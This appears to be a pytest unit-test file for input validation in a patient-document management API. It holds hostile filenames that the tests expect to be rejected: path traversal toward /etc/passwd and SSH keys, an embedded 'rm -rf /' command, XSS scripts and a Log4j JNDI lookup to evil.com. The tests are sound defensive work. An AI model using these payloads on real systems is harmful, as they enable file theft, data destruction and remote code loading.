"""
Unit Tests for Document Management Schemas and Validation

Tests for Pydantic schemas with security and compliance validation.
"""

import pytest
import uuid
from datetime import datetime, timedelta
from typing import Dict, Any

from pydantic import ValidationError
from app.modules.document_management.schemas import (
    DocumentUploadRequest, DocumentUpdateRequest, DocumentSearchRequest,
    BulkDeleteRequest, BulkUpdateTagsRequest, DocumentShareRequest
)
from app.core.database_unified import DocumentType


class TestDocumentUploadRequestValidation:
    """Test suite for DocumentUploadRequest validation."""
    
    def test_valid_upload_request(self):
        """Test valid document upload request."""
        request = DocumentUploadRequest(
            patient_id=str(uuid.uuid4()),
            filename="test_document.pdf",
            document_type=DocumentType.LAB_RESULT,
            document_category="Laboratory",
            tags=["urgent", "lab"],
            metadata={"test": "value"}
        )
        
        assert request.patient_id is not None
        assert request.filename == "test_document.pdf"
        assert request.document_type == DocumentType.LAB_RESULT
        assert request.tags == ["urgent", "lab"]
    
    def test_invalid_patient_id(self):
        """Test upload request with invalid patient ID."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentUploadRequest(
                patient_id="not-a-uuid",
                filename="test.pdf",
                document_type=DocumentType.LAB_RESULT
            )
        
        assert "Patient ID must be a valid UUID" in str(exc_info.value)
    
    def test_dangerous_filename_characters(self):
        """Test upload request with dangerous filename characters."""
        dangerous_filenames = [
            "../../../etc/passwd",
            "file<script>alert('xss')</script>.pdf",
            "file|rm -rf /.pdf",
            "file:alternate:stream.pdf",
            "file?.pdf",
            "file*.pdf"
        ]
        
        for dangerous_name in dangerous_filenames:
            with pytest.raises(ValidationError) as exc_info:
                DocumentUploadRequest(
                    patient_id=str(uuid.uuid4()),
                    filename=dangerous_name,
                    document_type=DocumentType.LAB_RESULT
                )
            assert "invalid characters" in str(exc_info.value)
    
    def test_empty_filename(self):
        """Test upload request with empty filename."""
        with pytest.raises(ValidationError):
            DocumentUploadRequest(
                patient_id=str(uuid.uuid4()),
                filename="",
                document_type=DocumentType.LAB_RESULT
            )
    
    def test_too_many_tags(self):
        """Test upload request with too many tags."""
        too_many_tags = [f"tag{i}" for i in range(25)]  # More than 20
        
        with pytest.raises(ValidationError) as exc_info:
            DocumentUploadRequest(
                patient_id=str(uuid.uuid4()),
                filename="test.pdf",
                document_type=DocumentType.LAB_RESULT,
                tags=too_many_tags
            )
        
        assert "Maximum 20 tags allowed" in str(exc_info.value)
    
    def test_tags_deduplication(self):
        """Test that tags are handled properly when None."""
        request = DocumentUploadRequest(
            patient_id=str(uuid.uuid4()),
            filename="test.pdf",
            document_type=DocumentType.LAB_RESULT,
            tags=None
        )
        
        assert request.tags == []


class TestDocumentUpdateRequestValidation:
    """Test suite for DocumentUpdateRequest validation."""
    
    def test_valid_update_request(self):
        """Test valid document update request."""
        request = DocumentUpdateRequest(
            filename="updated_document.pdf",
            document_type=DocumentType.CLINICAL_NOTE,
            document_category="Clinical",
            tags=["updated", "clinical"],
            metadata={"updated": True}
        )
        
        assert request.filename == "updated_document.pdf"
        assert request.document_type == DocumentType.CLINICAL_NOTE
        assert request.tags == ["updated", "clinical"]
    
    def test_partial_update_request(self):
        """Test partial update request with only some fields."""
        request = DocumentUpdateRequest(
            tags=["new-tag"]
        )
        
        assert request.filename is None
        assert request.document_type is None
        assert request.tags == ["new-tag"]
    
    def test_filename_security_validation(self):
        """Test filename security validation in updates."""
        dangerous_names = [
            "../../../etc/passwd",
            "file\\windows\\system32\\config",
            "file../.ssh/id_rsa",
            "file<>:\"|?*.pdf"
        ]
        
        for dangerous_name in dangerous_names:
            with pytest.raises(ValidationError) as exc_info:
                DocumentUpdateRequest(filename=dangerous_name)
            assert "prohibited characters" in str(exc_info.value)
    
    def test_empty_filename_validation(self):
        """Test that empty filename is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentUpdateRequest(filename="   ")  # Whitespace only
        assert "cannot be empty" in str(exc_info.value)
    
    def test_tags_limit_validation(self):
        """Test tags limit validation."""
        too_many_tags = [f"tag{i}" for i in range(25)]
        
        with pytest.raises(ValidationError) as exc_info:
            DocumentUpdateRequest(tags=too_many_tags)
        assert "Maximum 20 tags allowed" in str(exc_info.value)
    
    def test_tags_deduplication_and_cleaning(self):
        """Test tags deduplication and cleaning."""
        request = DocumentUpdateRequest(
            tags=["tag1", "tag1", "  tag2  ", "", "tag3", "tag2"]
        )
        
        # Should remove duplicates and empty tags, and strip whitespace
        expected_tags = ["tag1", "tag2", "tag3"]
        assert sorted(request.tags) == sorted(expected_tags)


class TestDocumentSearchRequestValidation:
    """Test suite for DocumentSearchRequest validation."""
    
    def test_valid_search_request(self):
        """Test valid document search request."""
        request = DocumentSearchRequest(
            patient_id=str(uuid.uuid4()),
            document_types=[DocumentType.LAB_RESULT, DocumentType.IMAGING],
            search_text="blood test",
            offset=0,
            limit=50,
            sort_by="uploaded_at",
            sort_order="desc"
        )
        
        assert request.patient_id is not None
        assert len(request.document_types) == 2
        assert request.search_text == "blood test"
    
    def test_minimal_search_request(self):
        """Test minimal search request with defaults."""
        request = DocumentSearchRequest()
        
        assert request.patient_id is None
        assert request.offset == 0
        assert request.limit == 50
        assert request.sort_by == "uploaded_at"
        assert request.sort_order == "desc"
    
    def test_invalid_patient_id_search(self):
        """Test search request with invalid patient ID."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentSearchRequest(patient_id="not-a-uuid")
        assert "Patient ID must be a valid UUID" in str(exc_info.value)
    
    def test_invalid_sort_field(self):
        """Test search request with invalid sort field."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentSearchRequest(sort_by="invalid_field")
        assert "Sort field must be one of" in str(exc_info.value)
    
    def test_invalid_sort_order(self):
        """Test search request with invalid sort order."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentSearchRequest(sort_order="invalid")
        assert "Sort order must be" in str(exc_info.value)
    
    def test_pagination_limits(self):
        """Test pagination validation."""
        # Test negative offset
        with pytest.raises(ValidationError):
            DocumentSearchRequest(offset=-1)
        
        # Test zero limit
        with pytest.raises(ValidationError):
            DocumentSearchRequest(limit=0)
        
        # Test limit too high
        with pytest.raises(ValidationError):
            DocumentSearchRequest(limit=2000)


class TestBulkDeleteRequestValidation:
    """Test suite for BulkDeleteRequest validation."""
    
    def test_valid_bulk_delete_request(self):
        """Test valid bulk delete request."""
        document_ids = [str(uuid.uuid4()), str(uuid.uuid4())]
        request = BulkDeleteRequest(
            document_ids=document_ids,
            reason="Bulk testing deletion",
            hard_delete=False
        )
        
        assert request.document_ids == document_ids
        assert request.reason == "Bulk testing deletion"
        assert request.hard_delete is False
    
    def test_invalid_document_ids(self):
        """Test bulk delete with invalid document IDs."""
        with pytest.raises(ValidationError) as exc_info:
            BulkDeleteRequest(
                document_ids=["not-a-uuid", "also-not-uuid"],
                reason="Valid reason"
            )
        assert "Invalid document ID" in str(exc_info.value)
    
    def test_empty_document_ids_list(self):
        """Test bulk delete with empty document IDs list."""
        with pytest.raises(ValidationError):
            BulkDeleteRequest(
                document_ids=[],
                reason="Valid reason"
            )
    
    def test_too_many_document_ids(self):
        """Test bulk delete with too many document IDs."""
        too_many_ids = [str(uuid.uuid4()) for _ in range(150)]  # More than 100
        
        with pytest.raises(ValidationError):
            BulkDeleteRequest(
                document_ids=too_many_ids,
                reason="Valid reason"
            )
    
    def test_duplicate_document_ids(self):
        """Test that duplicate document IDs are removed."""
        doc_id = str(uuid.uuid4())
        request = BulkDeleteRequest(
            document_ids=[doc_id, doc_id, doc_id],
            reason="Valid reason"
        )
        
        assert len(request.document_ids) == 1
        assert request.document_ids[0] == doc_id
    
    def test_invalid_reason_length(self):
        """Test bulk delete with invalid reason length."""
        # Too short
        with pytest.raises(ValidationError) as exc_info:
            BulkDeleteRequest(
                document_ids=[str(uuid.uuid4())],
                reason="x"
            )
        assert "at least 3 characters" in str(exc_info.value)
        
        # Too long
        too_long_reason = "x" * 600
        with pytest.raises(ValidationError):
            BulkDeleteRequest(
                document_ids=[str(uuid.uuid4())],
                reason=too_long_reason
            )
    
    def test_reason_whitespace_stripping(self):
        """Test that reason whitespace is stripped."""
        request = BulkDeleteRequest(
            document_ids=[str(uuid.uuid4())],
            reason="  Valid reason with spaces  "
        )
        
        assert request.reason == "Valid reason with spaces"


class TestBulkUpdateTagsRequestValidation:
    """Test suite for BulkUpdateTagsRequest validation."""
    
    def test_valid_bulk_update_tags_request(self):
        """Test valid bulk update tags request."""
        document_ids = [str(uuid.uuid4()), str(uuid.uuid4())]
        request = BulkUpdateTagsRequest(
            document_ids=document_ids,
            tags=["tag1", "tag2"],
            action="replace"
        )
        
        assert request.document_ids == document_ids
        assert request.tags == ["tag1", "tag2"]
        assert request.action == "replace"
    
    def test_different_actions(self):
        """Test different tag update actions."""
        document_ids = [str(uuid.uuid4())]
        
        for action in ["add", "remove", "replace"]:
            request = BulkUpdateTagsRequest(
                document_ids=document_ids,
                tags=["tag1"],
                action=action
            )
            assert request.action == action
    
    def test_invalid_action(self):
        """Test bulk update tags with invalid action."""
        with pytest.raises(ValidationError) as exc_info:
            BulkUpdateTagsRequest(
                document_ids=[str(uuid.uuid4())],
                tags=["tag1"],
                action="invalid_action"
            )
        assert "Action must be one of" in str(exc_info.value)
    
    def test_tags_validation_and_cleaning(self):
        """Test tags validation and cleaning."""
        request = BulkUpdateTagsRequest(
            document_ids=[str(uuid.uuid4())],
            tags=["  tag1  ", "tag2", "", "tag1", "x" * 60],  # Includes duplicates, empty, and too long
            action="add"
        )
        
        # Should remove duplicates, empty tags, and overly long tags
        assert "tag1" in request.tags
        assert "tag2" in request.tags
        assert "" not in request.tags
        assert len(request.tags) <= 2  # Duplicates removed
    
    def test_empty_tags_list(self):
        """Test bulk update tags with empty tags list after cleaning."""
        with pytest.raises(ValidationError) as exc_info:
            BulkUpdateTagsRequest(
                document_ids=[str(uuid.uuid4())],
                tags=["", "   ", "x" * 60],  # All invalid tags
                action="add"
            )
        assert "At least one valid tag is required" in str(exc_info.value)
    
    def test_too_many_tags(self):
        """Test bulk update tags with too many tags."""
        too_many_tags = [f"tag{i}" for i in range(25)]
        
        # This should not raise an error during creation but will be limited to 20
        request = BulkUpdateTagsRequest(
            document_ids=[str(uuid.uuid4())],
            tags=too_many_tags,
            action="add"
        )
        
        assert len(request.tags) <= 20


class TestDocumentShareRequestValidation:
    """Test suite for DocumentShareRequest validation."""
    
    def test_valid_share_request(self):
        """Test valid document share request."""
        request = DocumentShareRequest(
            shared_with=str(uuid.uuid4()),
            permissions={"view": True, "download": True},
            expires_at=datetime.now() + timedelta(days=7)
        )
        
        assert request.shared_with is not None
        assert request.permissions["view"] is True
        assert request.permissions["download"] is True
    
    def test_public_share_request(self):
        """Test public share request (shared_with = None)."""
        request = DocumentShareRequest(
            shared_with=None,
            permissions={"view": True}
        )
        
        assert request.shared_with is None
        assert request.permissions["view"] is True
    
    def test_invalid_shared_with_uuid(self):
        """Test share request with invalid shared_with UUID."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentShareRequest(
                shared_with="not-a-uuid",
                permissions={"view": True}
            )
        assert "Shared with must be a valid UUID" in str(exc_info.value)
    
    def test_invalid_permissions(self):
        """Test share request with invalid permissions."""
        with pytest.raises(ValidationError) as exc_info:
            DocumentShareRequest(
                shared_with=str(uuid.uuid4()),
                permissions={"view": True, "delete": True}  # delete not allowed
            )
        assert "Invalid permission: delete" in str(exc_info.value)
    
    def test_default_permissions(self):
        """Test default permissions."""
        request = DocumentShareRequest()
        
        assert request.permissions == {"view": True}
        assert request.shared_with is None
        assert request.expires_at is None


class TestSecurityValidationEdgeCases:
    """Test suite for security validation edge cases."""
    
    def test_null_byte_injection(self):
        """Test protection against null byte injection."""
        with pytest.raises(ValidationError):
            DocumentUploadRequest(
                patient_id=str(uuid.uuid4()),
                filename="evil_file.pdf\x00.txt",
                document_type=DocumentType.LAB_RESULT
            )
    
    def test_unicode_normalization_attacks(self):
        """Test protection against Unicode normalization attacks."""
        # Unicode characters that might be normalized to dangerous ones
        suspicious_filenames = [
            "file\u202e.pdf",  # Right-to-left override
            "file\u200b.pdf",  # Zero-width space
            "file\ufeff.pdf",  # Zero-width no-break space
        ]
        
        for filename in suspicious_filenames:
            # These should either be rejected or properly normalized
            try:
                request = DocumentUploadRequest(
                    patient_id=str(uuid.uuid4()),
                    filename=filename,
                    document_type=DocumentType.LAB_RESULT
                )
                # If accepted, filename should be cleaned
                assert len(request.filename.encode('ascii', 'ignore')) > 0
            except ValidationError:
                # Rejection is also acceptable
                pass
    
    def test_very_long_inputs(self):
        """Test handling of very long inputs."""
        # Test very long filename (should be rejected)
        very_long_filename = "a" * 1000
        with pytest.raises(ValidationError):
            DocumentUploadRequest(
                patient_id=str(uuid.uuid4()),
                filename=very_long_filename,
                document_type=DocumentType.LAB_RESULT
            )
        
        # Test very long tag (should be cleaned)
        very_long_tag = "tag" + "a" * 100
        request = BulkUpdateTagsRequest(
            document_ids=[str(uuid.uuid4())],
            tags=[very_long_tag],
            action="add"
        )
        # Should be filtered out due to length
        assert very_long_tag not in request.tags
    
    def test_script_injection_attempts(self):
        """Test protection against script injection attempts."""
        script_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "#{7*7}",  # Template injection
        ]
        
        for script in script_attempts:
            with pytest.raises(ValidationError):
                DocumentUploadRequest(
                    patient_id=str(uuid.uuid4()),
                    filename=f"file_{script}.pdf",
                    document_type=DocumentType.LAB_RESULT
                )


if __name__ == "__main__":
    # Run tests with: python -m pytest app/modules/document_management/test_schemas_validation.py -v
    pytest.main([__file__, "-v"])